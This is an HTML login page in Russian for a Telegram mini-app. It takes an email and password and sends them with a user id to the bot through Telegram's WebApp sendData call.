<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Авторизация</title>
    <style>
        body { font-family: Arial, padding: 20px; max-width: 400px; margin: 0 auto; }
        .form-group { margin-bottom: 15px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; }
        button { background: #2481cc; color: white; border: none; padding: 12px; width: 100%; }
        #status { margin-top: 15px; color: red; }
    </style>
</head>
<body>
    <h2>Авторизация</h2>
    <form id="authForm">
        <div class="form-group">
            <input type="email" id="email" required placeholder="Email">
        </div>
        <div class="form-group">
            <input type="password" id="password" required placeholder="Пароль">
        </div>
        <button type="submit">Войти</button>
    </form>
    <div id="status"></div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('authForm');
            const statusEl = document.getElementById('status');
            
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                const user_id = new URLSearchParams(window.location.search).get('user_id');
                
                if (!email || !password) {
                    statusEl.textContent = "Заполните все поля!";
                    return;
                }
                
                try {
                    if (window.Telegram?.WebApp?.sendData) {
                        const data = {
                            action: "auth",
                            email: email,
                            password: password,
                            telegram_id: user_id
                        };
                        Telegram.WebApp.sendData(JSON.stringify(data));
                        Telegram.WebApp.close();
                    } else {
                        statusEl.textContent = "Ошибка: открыто вне Telegram";
                    }
                } catch (err) {
                    statusEl.textContent = "Ошибка отправки данных";
                    console.error(err);
                }
            });
        });
    </script>
</body>
</html>
